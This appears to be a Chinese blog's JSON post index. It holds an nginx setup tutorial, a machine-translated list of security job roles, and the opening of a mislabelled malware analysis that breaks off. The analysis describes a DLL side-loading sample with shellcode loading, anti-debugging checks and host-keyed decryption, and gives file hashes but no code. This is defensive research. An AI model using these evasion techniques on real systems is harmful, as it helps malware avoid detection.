{"meta":{"title":"Blog","subtitle":"by","description":"by","author":"Wayoka","url":"http://wayoka.github.io","root":"/"},"pages":[{"title":"about","date":"2021-10-27T03:26:33.000Z","updated":"2021-10-27T03:26:33.713Z","comments":true,"path":"about/index.html","permalink":"http://wayoka.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-10-27T03:07:17.000Z","updated":"2021-10-27T03:07:18.018Z","comments":true,"path":"categories/index.html","permalink":"http://wayoka.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-10-27T03:26:54.000Z","updated":"2021-10-27T03:26:54.643Z","comments":true,"path":"tags/index.html","permalink":"http://wayoka.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-10-27T03:26:02.000Z","updated":"2021-10-27T03:26:02.171Z","comments":true,"path":"categories/index-1.html","permalink":"http://wayoka.github.io/categories/index-1.html","excerpt":"","text":""}],"posts":[{"title":"commit-220117","slug":"commit-220117","date":"2022-01-17T09:29:35.000Z","updated":"2022-01-17T09:29:35.714Z","comments":true,"path":"2022/01/17/commit-220117/","link":"","permalink":"http://wayoka.github.io/2022/01/17/commit-220117/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"nginx简单使用","slug":"nginx使用","date":"2022-01-02T09:36:03.000Z","updated":"2022-01-17T09:08:52.378Z","comments":false,"path":"2022/01/02/nginx使用/","link":"","permalink":"http://wayoka.github.io/2022/01/02/nginx%E4%BD%BF%E7%94%A8/","excerpt":"功能： 1. nginx搭建简单文件服务器 2. nginx启用https 3. nginx简单登录认证 4. nginx添加fancyindex美化模块 5. nginx设置代理与其他模块配合使用 1. nginx搭建简单文件服务器 1.1 安装nginx Linux下安装nginx使用系统安装命令安装即可，一般安装命令为： 1 2 3 4 # centos yum -y install nginx # ubuntu apt-get install nginx 1.2 修改用户 默认安装后，配置文件一般在/etc/nginx目录下，配置文件为nginx.conf，配置","text":"功能： nginx搭建简单文件服务器 nginx启用https nginx简单登录认证 nginx添加fancyindex美化模块 nginx设置代理与其他模块配合使用 1. nginx搭建简单文件服务器1.1 安装nginxLinux下安装nginx使用系统安装命令安装即可，一般安装命令为： 1234# centosyum -y install nginx# ubuntuapt-get install nginx 1.2 修改用户默认安装后，配置文件一般在/etc/nginx目录下，配置文件为nginx.conf，配置文件前几行存在user nginx;，表示使用nginx的用户为nginx，需要改为使用用户，如使用root安装的nginx，要将user nginx;修改为user root;。 1.3 nginx命令1.3.1 html目录nginx的默认html目录在/usr/share/nginx/html路径下，这个路径可以在nginx的配置文件nginx.conf中修改。 可以在/usr/share/nginx/html目录下新建文件夹，正常启动nginx后可以在浏览器中访问到。 1.3.2 检查配置文件nginx检查配置文件命令用于检查/etc/nginx/nginx.conf文件是否正常加载，如果配置文件出错会有提示。 配置文件检查命令如下： 1nginx -t -c /etc/nginx/nginx.conf 检查没有问题输出结果： 12nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful 1.3.2 启动停止nginxnginx默认安装后会添加到服务中，可以通过服务命令启动停止 123456# 服务启动nginxservice nginx start# 服务停止nginxservice nginx stop# 服务重新加载nginx配置文件service reload nginx 还可以通过systemctl命令停止启动nginx 12345678# 系统启动nginxsystemctl start nginx# 系统停止nginxsystemctl stop nginx# 系统重启nginxsystemctl restart nginx.service# 系统重新加载nginx配置文件systemctl reload nginx nginx启动后可以使用浏览器访问网页查看nginx是否启动 2. nginx启用httpsnginx使用https需要有X509证书，X509证书可以自己申请，也可以使用openssl命令直接生成。 使用openssl命令生成证书步骤如下： 2.1 openssl生成证书生成证书命令如下： 12345678910# 打到nginx配置文件目录$ cd /etc/nginx/# 创建ssl目录用于存放公私钥$ mkdir ssl# 使用openssl生成无密码server.key$ openssl rsa -in server.key -out server.key# 创建服务器证书的申请文件 server.csr，按照提示输入国家、省份、城市、公司、部门及邮箱$ openssl req -new -key server.key -out server.csr# 生成crt证书文件server.crt$ openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650 执行上述命令后会在ssl目录下生成3个文件：server.crt、server.csr、server.key 2.2 修改nginx配置文件修改nginx配置文件以使nginx支持https 配置文件依旧是/etc/nginx/nginx.conf，修改配置文件中http下server中的内容； 将nginx.conf文件中以下部分 1234567891011121314151617server &#123; listen 80; listen [::]:80; server_name _; root /usr/share/nginx/html; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; error_page 404 /404.html; location = /404.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125;&#125; 替换为： 123456789101112131415161718192021222324252627282930server &#123; listen 556 default_server; listen [::]:555 default_server; listen 443 ssl http2 default_server; listen [::]:443 ssl http2 default_server; server_name _; root /usr/share/nginx/html; charset utf-8,gbk; #展示中文文件名 ssl_certificate &quot;/etc/nginx/ssl/server.crt&quot;; ssl_certificate_key &quot;/etc/nginx/ssl/server.key&quot;; ssl_session_cache shared:SSL:1m; ssl_session_timeout 10m; ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; #listen 80; #listen [::]:80; #server_name _; #root /usr/share/nginx/html; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; error_page 404 /404.html; location = /404.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125; 调用命令：systemctl restart nginx.service重启nginx，本地查看是否报错，浏览器查看是否可以通过https访问，正常的话nginx应该启动监听555和443端口，可以使用netstat -tunpl | grep nginx命令查看nginx是否正常启动。 3. nginx简单登录认证3.1 使用htpasswd创建密码文件123456789# 在nginx配置文件中创建目录$ cd /etc/nginx# 创建pwd目录用于存放密码文件$ mkdir pwd# 生成密码文件，登陆名为user，按要求输入密码，生成密码文件为.samplepwd$ htpasswd -c /etc/nginx/pwd/.samplepwd userNew password:Re-type new password:Adding password for user ngin 3.2 修改配置文件配置文件：/etc/nginx/nginx.conf 如果想用户访问sample目录时需要登陆，可以做如下设置： 1234567891011121314151617181920212223242526272829303132333435server &#123; listen 556 default_server; listen [::]:555 default_server; listen 443 ssl http2 default_server; listen [::]:443 ssl http2 default_server; server_name _; root /usr/share/nginx/html; charset utf-8,gbk; #展示中文文件名 ssl_certificate &quot;/etc/nginx/ssl/server.crt&quot;; ssl_certificate_key &quot;/etc/nginx/ssl/server.key&quot;; ssl_session_cache shared:SSL:1m; ssl_session_timeout 10m; ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; #listen 80; #listen [::]:80; #server_name _; #root /usr/share/nginx/html; ###########新增登录认证############### location ^~/sample/&#123; auth_basic &quot;login&quot;; auth_basic_user_file /etc/nginx/pwd/.samplepwd; &#125; ######################################### # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; error_page 404 /404.html; location = /404.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125; 重启nginx就可以实现访问特定目录需要登录认证。 4.nginx添加fancyindex美化模块4.1 下载fancyindex模块可以直接到Fancyindex项目地址下载：https://github.com/aperezdc/ngx-fancyindex 下载好后解压到某目录下，如/usr/local/src 4.2 nginx重新安装nginx添加fancyindex模块需要在安装时就添加此模块，如果已安装nginx，需要停止nginx并重新安装 执行： 123$ nginx -s quit$ nginx -Vconfigure arguments: --prefix=/usr/share/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib64/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --http-client-body-temp-path=/var/lib/nginx/tmp/client_body --http-proxy-temp-path=/var/lib/nginx/tmp/proxy --http-fastcgi-temp-path=/var/lib/nginx/tmp/fastcgi --http-uwsgi-temp-path=/var/lib/nginx/tmp/uwsgi --http-scgi-temp-path=/var/lib/nginx/tmp/scgi --pid-path=/run/nginx.pid --lock-path=/run/lock/subsys/nginx --user=nginx --group=nginx --with-compat --with-debug --with-file-aio --with-google_perftools_module --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_degradation_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_image_filter_module=dynamic --with-http_mp4_module --with-http_perl_module=dynamic --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-http_xslt_module=dynamic --with-mail=dynamic --with-mail_ssl_module --with-pcre --with-pcre-jit --with-stream=dynamic --with-stream_ssl_module --with-stream_ssl_preread_module --with-threads 复制configure arguments中的值。 下载nginx源码并解压，cd到源码目录下，手动安装nginx 执行编译时在编译参数中添加模块路径 12$ ./configure --prefix=/usr/share/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib64/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --http-client-body-temp-path=/var/lib/nginx/tmp/client_body --http-proxy-temp-path=/var/lib/nginx/tmp/proxy --http-fastcgi-temp-path=/var/lib/nginx/tmp/fastcgi --http-uwsgi-temp-path=/var/lib/nginx/tmp/uwsgi --http-scgi-temp-path=/var/lib/nginx/tmp/scgi --pid-path=/run/nginx.pid --lock-path=/run/lock/subsys/nginx --user=nginx --group=nginx --with-compat --with-debug --with-file-aio --with-google_perftools_module --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_degradation_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_image_filter_module=dynamic --with-http_mp4_module --with-http_perl_module=dynamic --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-http_xslt_module=dynamic --with-mail=dynamic --with-mail_ssl_module --with-pcre --with-pcre-jit --with-stream=dynamic --with-stream_ssl_module --with-stream_ssl_preread_module --with-threads --add-module=/usr/local/src/ngx-fancyindex-0.5.2$ make &amp;&amp; make install 4.3 修改配置文件修改/etc/nginx/nginx.conf配置文件 ，添加fancyindex部分，并添加功能开启gzip提高传输速度。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147# For more information on configuration, see:# * Official English Documentation: http://nginx.org/en/docs/# * Official Russian Documentation: http://nginx.org/ru/docs/user nginx;worker_processes auto;error_log /var/log/nginx/error.log;pid /run/nginx.pid;# Load dynamic modules. See /usr/share/doc/nginx/README.dynamic.include /usr/share/nginx/modules/*.conf;events &#123; worker_connections 1024;&#125;http &#123; log_format main &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27; &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27; &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;; map $http_upgrade $connection_upgrade &#123; default upgrade; &#x27;&#x27; close; &#125; access_log /var/log/nginx/access.log main; autoindex on;# 显示目录 autoindex_exact_size on;# 显示文件大小 autoindex_localtime on;# 显示文件时间 sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 4096;# Enable gzip compression. gzip on; # Compression level (1-9). # 5 is a perfect compromise between size and CPU usage, offering about # 75% reduction for most ASCII files (almost identical to level 9). gzip_comp_level 5; # Don&#x27;t compress anything that&#x27;s already small and unlikely to shrink much # if at all (the default is 20 bytes, which is bad as that usually leads to # larger files after gzipping). gzip_min_length 256; # Compress data even for clients that are connecting to us via proxies, # identified by the &quot;Via&quot; header (required for CloudFront). gzip_proxied any; # Tell proxies to cache both the gzipped and regular version of a resource # whenever the client&#x27;s Accept-Encoding capabilities header varies; # Avoids the issue where a non-gzip capable client (which is extremely rare # today) would display gibberish if their proxy gave them the gzipped version. gzip_vary on; # Compress all output labeled with one of the following MIME-types. gzip_types application/atom+xml application/javascript application/json application/ld+json application/manifest+json application/rss+xml application/vnd.geo+json application/vnd.ms-fontobject application/x-font-ttf application/x-web-app-manifest+json application/xhtml+xml application/xml font/opentype image/bmp image/svg+xml image/x-icon text/cache-manifest text/css text/plain text/vcard text/vnd.rim.location.xloc text/vtt text/x-component text/x-cross-domain-policy; # text/html is always compressed by gzip module # This should be turned on if you are going to have pre-compressed copies (.gz) of # static files available. If not it should be left off as it will cause extra I/O # for the check. It is best if you enable this in a location&#123;&#125; block for # a specific directory, or on an individual server&#123;&#125; level. # gzip_static on; include /etc/nginx/mime.types; default_type application/octet-stream; # Load modular configuration files from the /etc/nginx/conf.d directory. # See http://nginx.org/en/docs/ngx_core_module.html#include # for more information. include /etc/nginx/conf.d/*.conf;# Settings for a TLS enabled server. server &#123; listen 555 default_server; listen [::]:555 default_server; listen 443 ssl http2 default_server; listen [::]:443 ssl http2 default_server; server_name _; root /usr/share/nginx/html; charset utf-8,gbk; #展示中文文件名 ssl_certificate &quot;/etc/nginx/ssl/server.crt&quot;; ssl_certificate_key &quot;/etc/nginx/ssl/server.key&quot;; ssl_session_cache shared:SSL:1m; ssl_session_timeout 10m; ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; location /&#123; root /usr/share/nginx/html; if ($request_filename ~* ^.*?\\.(txt|doc|pdf|rar|gz|zip|docx|exe|xlsx|ppt|pptx)$)&#123; add_header Content-Disposition attachment;&#125; &#125; fancyindex on; fancyindex_exact_size off; fancyindex_name_length 500; fancyindex_show_dotfiles on; fancyindex_localtime on; fancyindex_time_format &quot;%Y-%m-%d %H:%M:%S&quot;; fancyindex_header &quot;/Nginx-Fancyindex-Theme-light/header.html&quot;; fancyindex_footer &quot;/Nginx-Fancyindex-Theme-light/footer.html&quot;; # Ignored files will not show up in the directory listing, but will still be public. fancyindex_ignore &quot;examplefile.html&quot;; # Making sure folder where these files are do not show up in the listing. fancyindex_ignore &quot;Nginx-Fancyindex-Theme-light&quot;; location ^~/sample/&#123; auth_basic &quot;login&quot;; auth_basic_user_file /etc/nginx/.samplepwd; &#125; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; error_page 404 /404.html; location = /40x.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125;&#125; 之后重启nginx即可，效果如下： 5. nginx设置代理项目需要使用webio搭建简单的文件上传服务器，需要将webio的端口映射到nginx上去，修改配置文件即可； 在http—-server下添加如下数据：将https://{ip}/webio/ 的地址映射到本地的/home/test/html/， 1234567891011121314151617181920location /webio/ &#123; alias /home/test/html/;&#125; location /webio/upload &#123; proxy_read_timeout 300s; proxy_send_timeout 300s; proxy_http_version 1.1; proxy_set_header Host $host:$server_port; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $connection_upgrade; proxy_pass http://localhost:5000/;&#125;# Load configuration files for the default server block.include /etc/nginx/default.d/*.conf;error_page 404 /404.html; location = /40x.html &#123;&#125;error_page 500 502 503 504 /50x.html; location = /50x.html &#123;&#125;","categories":[{"name":"nginx","slug":"nginx","permalink":"http://wayoka.github.io/categories/nginx/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://wayoka.github.io/tags/nginx/"},{"name":"实用模块","slug":"实用模块","permalink":"http://wayoka.github.io/tags/%E5%AE%9E%E7%94%A8%E6%A8%A1%E5%9D%97/"}]},{"title":"安全行业职位介绍","slug":"专业职位解释","date":"2021-04-13T06:19:37.000Z","updated":"2021-10-29T10:35:24.499Z","comments":true,"path":"2021/04/13/专业职位解释/","link":"","permalink":"http://wayoka.github.io/2021/04/13/%E4%B8%93%E4%B8%9A%E8%81%8C%E4%BD%8D%E8%A7%A3%E9%87%8A/","excerpt":"安全行业职位介绍 网络威胁情报分析师(Cyber Threat Intelligence Analyst) 作为网络威胁情报分析师的日常工作可能包括研究世界范围内与您的行业相关的网络事件，分析黑客工具，APT小组使用的TTP以及对手的行为模式，以识别公司可能面临的潜在威胁。您可以将Threat Detection Marketplace的功能和内容用于以下用例和过程： * 历史IOC匹配查询 * 使用大量MITER ATT＆CK®集的多种组合进行基于行为的威胁搜寻的基于TTP的检测：参与者，工具和技术 * 向SOC团队提供建议以部署基于TTP的检测 * 您自己的最前沿提要是有关映射","text":"安全行业职位介绍 网络威胁情报分析师(Cyber Threat Intelligence Analyst)作为网络威胁情报分析师的日常工作可能包括研究世界范围内与您的行业相关的网络事件，分析黑客工具，APT小组使用的TTP以及对手的行为模式，以识别公司可能面临的潜在威胁。您可以将Threat Detection Marketplace的功能和内容用于以下用例和过程： 历史IOC匹配查询 使用大量MITER ATT＆CK®集的多种组合进行基于行为的威胁搜寻的基于TTP的检测：参与者，工具和技术 向SOC团队提供建议以部署基于TTP的检测 您自己的最前沿提要是有关映射到ATT＆CK的最新威胁，工具，技术和行为者以及检测，攻击模拟，响应和缓解功能的状态以及基本情况的信息，比一般威胁情报报告要提前几天和几周，比国际奥委会提前数月或数年 学习Sigma语言，它是表达威胁搜寻查询并生成跨平台SIEM和EDR检测内容的实际标准，并与Threat Intelligence报告共享 利用Sigma将IOC的集合动态打包到查询中，以查询最主要的SIEM，日志管理和EDR解决方案将于2020年秋季推出 威胁猎人(Threat Hunter)作为威胁搜寻工程师的日常工作可能包括：主动搜索IOC，根据MITER ATT＆CK®策略和技术研究APT小组使用的TTP，监视日志，跟踪SIEM和EDR触发的警报，设置威胁搜寻优先级和假设。您可以将Threat Detection Marketplace的内容和功能用于以下用例和过程： 基于Windows Active Directory日志的规则，用于使用ATT＆CK Actor，工具和技术的各种组合进行基于TTP的威胁搜寻 MITRE ATT＆CK页面可优先进行狩猎 YARA恶意软件搜寻规则 历史IOC匹配查询 SIEM内容开发人员(SIEM Content Developer)作为检测工程师的日常工作可能包括提供连续的事件收集和日志管理，密切关注SIEM的运行状况，分析最新的威胁和对手以定义攻击优先级，并按照它们来开发与公司需求和SIEM相关的自定义内容。您可以将Threat Detection Marketplace的内容和功能用于以下用例和过程： 使用Sigma规则（用于SIEM系统的通用和开放规则格式）使用和自定义关联和威胁搜寻内容，该规则已迅速成为表达检测和威胁搜寻的事实标准 通过设置自定义数据模式来克服所有解析问题，该模式将即时重写任何规则和查询字段以适合您的数据模型 通过持续内容管理，强大的Rule Master过滤器，平台集成配置和API访问功能来简化规则管理 使用Sigma UI工具开发面向未来的规则并自定义其翻译，以避免平台锁定您的组织并成为跨平台检测专家 在“通缉”页面上对内容开发优先级进行排序 利用世界一流的支持为您的环境和版本自定义内容 直接使用平台中的MITER ATT＆CK®或通过与ATT＆CK Navigator集成来计划和管理SOC内容路线图 红队专员(Red Team Specialist)作为红队专家的日常工作可能包括赶上最新的网络安全新闻和趋势，包括新出现的威胁，漏洞，黑客工具和TTP，实施渗透测试和其他攻击模拟活动，以分析其可能对网络安全造成的影响。公司系统。您可以将Threat Detection Marketplace的内容和功能用于以下用例和过程： RED测试，用于实现仿真请求 绕过检测 向SOC团队提供建议以部署基于TTP的检测 使用MITER ATT＆CK®展示安全漏洞并解决参与者，技术和工具 端点安全专员(Endpoint Security Specialist)作为Endpoint Security Specialist的日常工作可能包括维护和监视EDR后端基础结构，分析潜在威胁并确定EDR系统中的漏洞。您可以将Threat Detection Marketplace的内容和功能用于以下用例和过程： 红色测试可在您的EDR中进行警报验证 通过利用从Sigma转换到Sysmon配置文件的1,000多个规则来增强Sysmon部署，以通过威胁上下文和MITER ATT＆CK®标签丰富信号 跟上直接映射到MITER ATT＆CK的最新检测 通过部署我们的内容来弥合默认EDR规则未涵盖的工具，参与者和技术方面的差距 只需单击一次深入查询，即可从市场直接转到EDR控制台 首席信息安全官(CISO)作为一名CISO，您可能几乎没有时间阅读此工具提示，因此我们将直接指导Threat Detection Marketplace将为您提供哪些帮助： 直接改善内部或外包SOC的MTTD和MTTR指标 通过能够在48小时之内主动部署检测到0.5％的真正关键漏洞，从而提前修复补丁程序中位数的62天补丁时间，从而修复漏洞管理流程 节省收集数据的成本，并获得有关收集日志和SIEM许可证的真正安全性的最新见解 通过使其能够监视主机，网络，应用程序，SaaS，PaaS，IaaS，业务关键型应用程序以及接下来发生的所有事情，最大化您的SIEM ROI，从而节省购置专用检测解决方案的成本 将每个检测结果映射到MITER ATT＆CK®，使其与您的威胁概况和环境相关 从过时的威胁检测和响应内容瀑布过程过渡到敏捷而连续的过程 通过使用Sigma（一种通用且与SIEM无关的规则格式）来避免平台锁定 根据MITER ATT＆CK完全了解差距和已解决的参与者，工具和技术的透明度 通过使用行为和TTP检测，从Threat Intelligence程序中获得全部价值，而不仅仅是依靠IOC 通过对整个行业的匿名见解来了解您与同行的竞争情况，并跟踪团队的进度 通过将全球众包和社区模型应用于规则，解析器，仪表板，SOAR / IR剧本和机器学习模型的研发来节省成本 顾问(Consultant)履行顾问职责的日常工作可能包括分析公司的安全系统，研究潜在的漏洞和痛点，监督解决最紧迫的安全问题的解决方案，指导整个组织或某些安全部门达到合规标准并推动改进确定的安全漏洞。您可以将Threat Detection Marketplace的内容和功能用于以下用例和过程： MITRE ATT＆CK®页面可分析最新的攻击媒介并建立检测路线图 用于确定公司在合规性方面满足的最低要求的合规性规则 用于检测关键威胁和制定公司缓解策略的各种规则 SOC经理(SOC Manager)作为SOC经理，您的日常工作可能包括不断了解最新的安全新闻，趋势和策略更新，以使您的公司能够建立高安全性标准，管理安全专家团队并为他们的日常任务提供支持，并进行改进以增强组织的安全保护。您可以为以下用例和过程利用内容和功能： 仪表板页面可跟踪您在SOC Prime平台内的团队活动，分析团队效率并确定趋势方向 在10,000多个安全性同行中运行实时基准测试，并查看如何与行业同行进行比较 使用MITER ATT＆CK®页面可以跟上动态攻击向量的步伐，可视化检测和数据缺口，建立路线图并将其与ATT＆CK Navigator集成 通过能够在48小时之内主动部署检测到0.5％的真正关键漏洞，从而提前修复补丁程序中位数的62天补丁时间，从而修复漏洞管理流程 通过将全球众包和社区模型应用于规则，解析器，仪表板，SOAR / IR剧本和机器学习模型的研发来节省成本 确保您的SOC检测和响应内容始终是最新的，不断更新的并且是面向未来的，以避免单一检测平台锁定 漏洞管理专家(Vulnerability Management Specialist)作为漏洞管理专家的日常工作可能包括研究与您的行业相关的最新CVE，恶意软件和漏洞，跟踪网络和安全漏洞，识别和分类风险和潜在问题以及过滤出误报。您可以将Threat Detection Marketplace的功能和内容用于以下用例和过程： 对最新的关键漏洞进行早期检测，包括趋势CVE和POC漏洞 优先考虑由检测规则支持，由全球社区审查且与您的软件堆栈相关的最关键的漏洞 运行历史查询以进行IOC匹配 SOC分析师(SOC Analyst)作为SOC分析师的日常工作可能包括监视和分析网络流量中是否存在恶意活动，管理IP地址和域，分析整个公司的通知和网络事件，与Threat Intelligence和事件响应团队合作以跟上特定于行业的情况攻击媒介。您将找到有助于您的内容： 通过将警报链接到基于MITER ATT＆CK®的工具，技术和参与者来了解警报的背景 了解基本和高级检测逻辑，查询和关联规则 熟悉Sigma规则，它是SIEM系统的通用和开放规则格式，已迅速成为表示检测和威胁搜寻的事实上的标准。 了解关键的安全事件ID和有助于调查的日志源 SIEM管理员(SIEM Administrator)作为SIEM管理员的日常工作可能包括安装和升级SIEM系统，通过定期检查来维护SIEM平台的稳定性和运行状况或提供适当的日志源集成。威胁检测市场将帮助您： 获取用于最关键数据源（包括主机，网络，应用程序，SaaS，PaaS和IaaS）的日志连接和规范化的解析器和配置 通过利用众包并与预先构建的解析器一起使用，可以在提取工程和解析器研发方面节省大量时间 利用世界一流的支持为您的环境和版本自定义内容 直接使用平台中的MITER ATT＆CK®或与ATT＆CK Navigator集成，计划和管理SOC日志源路线图 网络安全专家(Network Security Specialist)作为网络安全专家的日常工作可能包括赶上最新的网络安全新闻和趋势，研究与公司安全需求相关的最新威胁，黑客工具，恶意软件，CVE，TTP和DDoS攻击，监视计算机网络的任何安全性威胁或未经授权的用户访问，开发和测试软件部署工具，防火墙和入侵检测系统，以及安装和更新安全软件。您可以利用以下Threat Detection Marketplace规则进行网络安全监视： 基于防火墙或代理日志的规则 适马规则的Zeek / Corelight 鼻息规则 使用最新版本的MITER ATT＆CK将所有检测规则映射到上下文 InfoSec /网络团队负责人(InfoSec/Cyber Team Lead)作为某个安全部门或SOC专家小组的团队负责人，您的日常工作基本上集中于管理和指导您的队友，以及衡量您的团队进步，效率和生产率，以实现有助于全球业务战略的安全目标。您可以将Threat Detection Marketplace的内容和功能用于以下用例和过程： 仪表板页面可跟踪您在一定时期内在平台上的团队活动的效率和生产率，并确定趋势方向 MITRE ATT＆CK®页面，以跟上快速变化的攻击媒介 学习和使用Sigma，这是SIEM系统的通用规则格式，也是用于表达威胁搜寻查询的实际标准 成为真正的跨平台专家，了解如何以及为何为那里最主要的SIEM，EDR和NSM工具构建和使用检测程序 使用Sigma编写面向未来的内容，以避免供应商锁定并保留检测内容的IP权限 跟踪团队绩效的最新指标，并与全球10,000多名同行进行基准比较 DevOps / IT主管(DevOps/IT Lead)作为DevOps或IT主管的日常工作涉及大量的日志管理，例如日志收集，聚合，解析，存储和分析，以确保应用程序和基础结构的安全性并处理故障排除，无论您的环境是否发生这些事件。 -前提或云。您可以基于日志源类型过滤，利用以下Threat Detection Marketplace内容进行日志监视： 用于Web服务器审核的基于Web服务器日志的规则 基于AWS，Azure，Azure AD或Office365日志的规则用于基于云的监视 通过获得对0.5％的重要安全漏洞的第一手见解来预期紧急补丁请求，这些漏洞很重要并且可以进行早期检测 使用CI / CD流程和敏捷理念管理威胁检测 初级专员/实习生(Junior Specialist/Intern)如果您只是刚开始进入InfoSec /网络安全领域，那么很容易感到困惑。您的日常工作将包括研究威胁状况，探索最新的攻击，CVE，攻击和TTP，以及根据提供的研究部署规则以模拟可疑活动，以便您可以充实自己的专业知识和磨练威胁检测技能。您可以针对以下用例和过程利用我们的平台功能： 了解Sigma，它是SIEM系统的通用规则格式，是表示威胁搜寻查询的实际标准 成为真正的跨平台专家，了解如何以及为何为那里最主要的SIEM，EDR和NSM工具构建和使用检测程序 使用Sigma编写面向未来的内容 始终了解最新和最相关的威胁，技术，工具，角色和漏洞 使用MITER ATT＆CK®页面可深入了解最新的Actor，工具和技术 从“帮助中心”部分获得收益，以探索操作指南并观看演练视频，以获取深刻的平台体验 探索包含67,000多个规则，查询，解析器，仪表板，机器学习配方和事件响应手册的不断增长的内容库，了解规则上下文，并将规则部署到您的环境中 成为未来很多年网络安全方面技能高超，需求最大的专家","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://wayoka.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"岗位介绍","slug":"网络安全/岗位介绍","permalink":"http://wayoka.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%B2%97%E4%BD%8D%E4%BB%8B%E7%BB%8D/"}],"tags":[{"name":"岗位介绍","slug":"岗位介绍","permalink":"http://wayoka.github.io/tags/%E5%B2%97%E4%BD%8D%E4%BB%8B%E7%BB%8D/"},{"name":"网络安全","slug":"网络安全","permalink":"http://wayoka.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"常用下载命令整理-Linux篇","slug":"海莲花样本分析（一）","date":"2021-01-03T01:36:51.000Z","updated":"2021-10-29T09:23:41.787Z","comments":false,"path":"2021/01/03/海莲花样本分析（一）/","link":"","permalink":"http://wayoka.github.io/2021/01/03/%E6%B5%B7%E8%8E%B2%E8%8A%B1%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"1.综述 本次分析的样本文件一共有两个，一个为带有微软标签的exe文件，经分析为微软的Microsoft®.NET Framework相关进程，为白文件；另一个是dll文件(黑文件)，该文件被上述exe文件加载后填充执行无意义代码，修改文件执行逻辑，填充shellcode调用Loadlibrary函数重新加载自身；加载资源段shellcode，创建线程执行资源段释放的shellcode，计算并比较调用dll文件的进程名称的hash是否为“fnplicensingservice.exe”的hash，用以反调试；获取计算机名称，根据计算机名称hash解密后续代码。 2.样本概述 2.1 FN","text":"1.综述本次分析的样本文件一共有两个，一个为带有微软标签的exe文件，经分析为微软的Microsoft®.NET Framework相关进程，为白文件；另一个是dll文件(黑文件)，该文件被上述exe文件加载后填充执行无意义代码，修改文件执行逻辑，填充shellcode调用Loadlibrary函数重新加载自身；加载资源段shellcode，创建线程执行资源段释放的shellcode，计算并比较调用dll文件的进程名称的hash是否为“fnplicensingservice.exe”的hash，用以反调试；获取计算机名称，根据计算机名称hash解密后续代码。 2.样本概述2.1 FNPLicensingService.exe 文件概述本次分析样本包含exe和dll两个pe文件，样本通过白文件(exe文件)调用黑文件(dll文件)执行恶意功能。白文件带有微软的数字签名，原始文件名为“applaunch.exe”，经分析该文件是微软的Microsoft®.NET Framework相关进程，版本为2.0.50727.5420。 白文件名称 FNPLicensingService.exe MD5 0F01571A3E4C71EB4313175AAE86488E sha256 8cc51c4c2efc8c6a401aa83a0aeced0925d5d9d2a43192f35561893cdf704022 文件版本 2.0.50727.5420 (Win7SP1.050727-5400) 文件大小 54.33 KB (55632 bytes) 2.2 mscoree.dll文件概述Windows下的“mscoree.dll”(32位)是“applaunch.exe”在运行时必须加载的模块之一，该文件位于Windows目录的SysWOW64路径下，文件带有微软的版权等相关信息。 本次分析的黑样本dll文件名称伪装为“mscoree.dll”(32位)，文件大小伪装为相似的大小，但是并无文件版本、版权等相关信息。 黑dll文件名称 mscoree.dll MD5 B5DFF8111D72DE616B3C0074CB510AC9 SHA1 C7FCC2611F6F91CDA8B5DD10B0BEFF57DBA3BF2F 文件大小 313856 字节 2.黑文件 mscoree.dll 分析2.1 黑文件 mscoree.dll 静态分析在“mscoree.dll”文件资源段中包含了一个名为274的文件夹，文件夹中包含文件名为 365 的资源文件，文件大小为 246 KB (252,595 字节)。 2.2 黑文件 mscoree.dll 